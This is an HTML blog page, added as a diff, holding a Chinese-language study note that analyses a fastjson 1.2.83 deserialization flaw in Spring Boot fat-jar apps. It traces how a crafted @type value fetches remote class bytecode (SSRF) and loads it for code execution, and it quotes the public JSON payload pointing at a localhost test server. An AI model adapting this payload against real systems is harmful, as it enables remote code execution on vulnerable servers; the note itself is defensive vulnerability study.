@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <meta name="google-site-verification" content="TZE0rZyIqLl10trYu3BWBWa1Vmz6HFwhb2OcNEK4u-s" />
+     <link rel="shortcut icon" href= /img/favicon.ico >
+    <title>
+        Dawn Nine学习笔记
+    </title>
+    <meta name="description" content=  >
+    <meta name="keywords" content= Dawn Nine,代码学习 >
+    
+<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body id="bodyx">
+    <div class="hd posts">
+    <a href="/index.html"><i class="fa fa-home
+ replay-btn" aria-hidden="true"></i></a>
+    <div class="post-title">
+        <p>
+            fastjson漏洞分析1.2.83
+        </p>
+        <hr>
+    </div>
+    <div class="post-content">
+        <h1 id="fastjson漏洞分析1-2-83"><a href="#fastjson漏洞分析1-2-83" class="headerlink" title="fastjson漏洞分析1.2.83"></a>fastjson漏洞分析1.2.83</h1><p>综合分析了一下链子不难，这个链子的核心点是利用了spring boot对classLoader类的重写，LaunchedURLClassLoader这个类是可以进行远程加载。</p>
+<p>这个的利用前提1、java包运行；2、采用了Fat Jar打包方式；</p>
+<blockquote>
+<p>对于SpringBoot方式进行Fat Jar打包，其实是包含了项目所有依赖的jar，这样就可以调用其他的jar包中的代码。</p>
+</blockquote>
+<h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><p>首先分析一下网传POC{“@type”:”jar:http:..2130706433:18080.probe!.POC”,”x”:1}，动态调试，</p>
+<p><img src="/2026/07/21/fastjson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%901-2-83/image-20260723000159548.png" alt="image-20260723000159548"></p>
+<p>看到@type根据之前文章分析，几乎可以肯定是在这个循环里面</p>
+<blockquote>
+<p>if (key &#x3D;&#x3D; JSON.DEFAULT_TYPE_KEY &amp;&amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) </p>
+</blockquote>
+<p><img src="/2026/07/21/fastjson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%901-2-83/image-20260723000048169.png" alt="image-20260723000048169"></p>
+<p>走向clazz &#x3D; this.config.checkAutoType(typeName, (Class)null, lexer.getFeatures());</p>
+<p><img src="/2026/07/21/fastjson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%901-2-83/image-20260723001007766.png" alt="image-20260723001007766"></p>
+<p>在checkAutoType()函数中String resource &#x3D; typeName.replace(‘.’, ‘&#x2F;‘) + “.class”;对传入的typeaname参数进行传入处理。参数把.替换成了&#x2F;。转换成了一个http协议的16进制写法，并且拼接好了要获取的文件后缀class。</p>
+<blockquote>
+<p>jar:http:..2130706433:18080.probe!.POC	&lt;-&gt;	jar:<a target="_blank" rel="noopener" href="http://127.0.0.1:18080/probe!/POC.class">http://2130706433:18080/probe!/POC.class</a></p>
+</blockquote>
+<h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><p>getResourceAsStream从远端拉取到了resource地址的字节码，在交由getClassLoader进行加载。（这个就是SSRF）</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">is = ParserConfig.class.getClassLoader().getResourceAsStream(resource);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/07/21/fastjson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%901-2-83/image-20260723002210186.png" alt="image-20260723002210186"></p>
+<p>收到相关请求</p>
+<h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><p><img src="/2026/07/21/fastjson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%901-2-83/image-20260723002305692.png" alt="image-20260723002305692"></p>
+<p>类加载调用了TypeUtils.loadClass()</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader, cacheClass);</span><br></pre></td></tr></table></figure>
+
+<p>在TypeUtils.loadClass函数中先进行异步线程，这个线程从内存中加载传入的类的名称，如果是非Fat Jar打包方式，这个jar文件无法从内存中获取到，只能获取到自己本身jar包的代码，因为使用了Fat Jar打包，这种方式是LaunchedURLClassLoader进行加载，这个是可以加载本地中的jar文件的代码。</p>
+<blockquote>
+<p>ClassLoader contextClassLoader &#x3D; Thread.currentThread().getContextClassLoader();</p>
+</blockquote>
+<p><img src="/2026/07/21/fastjson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%901-2-83/image-20260723003332207.png" alt="image-20260723003332207"></p>
+<blockquote>
+<p>contextClassLoader参数</p>
+</blockquote>
+<p>再通过contextClassLoader.loadClass进行静态初始类，从而达到RCE。</p>
+<blockquote>
+<p>clazz &#x3D; contextClassLoader.loadClass(className);</p>
+</blockquote>
+<p><img src="/2026/07/21/fastjson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%901-2-83/image-20260723002528740.png" alt="image-20260723002528740"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个链子不算难，但是利用了spring boot的Fat Jar打包方式的特性，通过LaunchedURLClassLoader可以进行本地加载相关类，在进行静态化初始类和对IP点的处理直接采用了16进制的写法。（对大佬膜拜）</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/ThanatosXingYu/2026FastjsonPoC/">https://github.com/ThanatosXingYu/2026FastjsonPoC/</a></p>
+<p><a target="_blank" rel="noopener" href="https://x.com/k_firsov/status/2079518378289713578">https://x.com/k_firsov/status/2079518378289713578</a></p>
+</blockquote>
+
+    </div>
+
+    
+        <hr class="fhr">
+        <div id="vcomments"></div>
+    
+</div>
+    <div class="footer" id="footer">
+    <p><h4>Copyright © 2020 | Author: Dawn Nine | Theme By <a class="theme-author" target="_blank" rel="noopener" href="https://github.com/Xunzhuo/hexo-theme-coder" style="font-size:14px; color: #969696">Coder</a></h4>
+    
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        <span id="busuanzi_container_site_pv">Page Views: <span id="busuanzi_value_site_pv"></span></span>
+        <span class="post-meta-divider">|</span>
+        <span id="busuanzi_container_site_uv">Unique Visitors: <span id="busuanzi_value_site_uv"></span></span>
+    
+    <label class="el-switch el-switch-blue el-switch-sm" style="vertical-align: sub;">
+        <input type="checkbox" name="switch" id="update_style">
+        <span class="el-switch-style"></span>
+    </label>
+
+    <!--         <script type="text/javascript">
+    var cnzz_protocol = (("https:" == document.location.protocol) ? "https://" : "http://");
+    document.write(unescape("%3Cspan id='cnzz_stat_icon_1278548644'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "v1.cnzz.com/stat.php%3Fid%3D1278548644%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));
+    </script> -->
+</p>
+</div>
+
+<input type="hidden" id="web_style" value="black">
+<input type="hidden" id="valine_appid" value="">
+<input type="hidden" id="valine_appKey" value="">
+
+<script src="/libs/jquery.min.js"></script>
+
+
+<script src="/libs/highlight/highlight.pack.js"></script>
+
+<script src='//cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js'></script>
+
+<script src="/js/js.js"></script>
+
+<style type="text/css">
+.v * {
+color: #698fca;
+}
+.v .vlist .vcard .vhead .vsys {
+color: #3a3e4a;
+}
+.v .vlist .vcard .vh .vmeta .vat {
+color: #638fd5;
+}
+.v .vlist .vcard .vhead .vnick {
+color: #6ba1ff;
+}
+.v a {
+color: #8696b1;
+}
+.v .vlist .vcard .vhead .vnick:hover {
+color: #669bfc;
+}
+</style>
+    <script type="text/javascript" color="173,174,173" opacity='1' zIndex="-2" count="99" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+</body>
+</html>
